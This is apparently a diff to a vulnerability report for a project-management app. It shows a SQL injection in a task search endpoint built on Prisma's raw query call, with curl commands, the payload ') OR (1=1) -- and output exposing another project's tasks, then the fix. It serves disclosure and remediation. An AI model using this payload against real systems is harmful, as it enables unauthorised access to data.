@@ -30,36 +30,72 @@ const sql = `
 const tasks = await prisma.$queryRawUnsafe(sql);
 ```
 
-### Bug in Action
+### Bug in Action (verified against live seed data)
+
+**Setup:** `kavya@example.com` is a member of **Q3 Launch** only. She has zero access to the **Customer Onboarding Revamp** project.
 
 ```bash
-# Attacker is a legitimate member of project "proj_aaa".
-# They craft a q value that removes the project filter entirely,
-# returning every task in the database.
+# 1. Login as kavya (member of Q3 Launch only)
+TOKEN=$(curl -s -X POST http://localhost:3000/api/auth/login \
+  -H "Content-Type: application/json" \
+  -d '{"email":"kavya@example.com","password":"password123"}' | jq -r '.token')
 
-TOKEN="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."   # valid token for any user
-
-curl -s "http://localhost:3000/api/projects/proj_aaa/tasks?q=%27%20OR%201%3D1--" \
-  -H "Authorization: Bearer $TOKEN"
+PROJECT_ID="<q3-launch-project-id>"   # from GET /api/projects
 ```
 
-The injected string `' OR 1=1--` turns the WHERE clause into:
-
-```sql
-WHERE project_id = 'proj_aaa'
-  AND (title ILIKE '%' OR 1=1-- %' OR description ILIKE '%%')
+**BEFORE — normal search (safe):**
+```bash
+curl -s -G "http://localhost:3000/api/projects/$PROJECT_ID/tasks" \
+  --data-urlencode "q=launch" \
+  -H "Authorization: Bearer $TOKEN" \
+  | jq '[.tasks[] | {title, project_id}]'
 ```
-
-Because `OR 1=1` is always true and `--` comments out the remainder, the database returns **all rows in the `tasks` table** regardless of project ownership:
-
 ```json
-{
-  "tasks": [
-    { "id": "task_111", "project_id": "proj_aaa", "title": "Q3 roadmap", ... },
-    { "id": "task_222", "project_id": "proj_bbb", "title": "Secret feature X", ... },
-    { "id": "task_333", "project_id": "proj_ccc", "title": "Security audit notes", ... }
-  ]
-}
+[
+  { "title": "Finalize launch date with marketing", "project_id": "cmq5korgm0006gs31i9atagk5" }
+]
+```
+
+**BEFORE — injection payload** `') OR (1=1) --`
+
+The payload closes the `ILIKE` string and the `AND (...)` group, then injects `OR (1=1)`. SQL operator precedence turns the whole WHERE into `(project_id = X AND title ILIKE '%') OR true`, returning every row in the table:
+
+```bash
+curl -s -G "http://localhost:3000/api/projects/$PROJECT_ID/tasks" \
+  --data-urlencode "q=') OR (1=1) --" \
+  -H "Authorization: Bearer $TOKEN" \
+  | jq '[.tasks[] | {title, project_id}]'
+```
+```json
+[
+  { "title": "Finalize launch date with marketing",         "project_id": "cmq5korgm0006gs31i9atagk5" },
+  { "title": "Map current onboarding funnel",              "project_id": "cmq5korgp000dgs318fyc9ylx" },
+  { "title": "Draft press release",                        "project_id": "cmq5korgm0006gs31i9atagk5" },
+  { "title": "Interview 5 recently-onboarded customers",   "project_id": "cmq5korgp000dgs318fyc9ylx" },
+  { "title": "Wireframe new welcome screens",              "project_id": "cmq5korgp000dgs318fyc9ylx" },
+  { "title": "Record demo video",                          "project_id": "cmq5korgm0006gs31i9atagk5" },
+  { "title": "Audit current onboarding emails",            "project_id": "cmq5korgp000dgs318fyc9ylx" },
+  { "title": "Set up analytics dashboards",                "project_id": "cmq5korgm0006gs31i9atagk5" },
+  { "title": "Define success metric (TTFV target)",        "project_id": "cmq5korgp000dgs318fyc9ylx" },
+  { "title": "Prepare customer email blast",               "project_id": "cmq5korgm0006gs31i9atagk5" },
+  { "title": "Update pricing page copy",                   "project_id": "cmq5korgm0006gs31i9atagk5" },
+  { "title": "QA the new signup flow end-to-end",          "project_id": "cmq5korgm0006gs31i9atagk5" }
+]
+```
+
+Kavya, a Q3 Launch member, is now reading tasks from the **Customer Onboarding Revamp** project (`cmq5korgp000dgs318fyc9ylx`).
+
+**AFTER fix — same payload returns zero results** (treated as a literal string search, no SQL is injected):
+
+```bash
+# Same curl command, same payload — after replacing $queryRawUnsafe with prisma.task.findMany
+curl -s -G "http://localhost:3000/api/projects/$PROJECT_ID/tasks" \
+  --data-urlencode "q=') OR (1=1) --" \
+  -H "Authorization: Bearer $TOKEN" \
+  | jq '{task_count: (.tasks | length)}'
+```
+```json
+{ "task_count": 0 }
 ```
 
 ### Recommended Fix
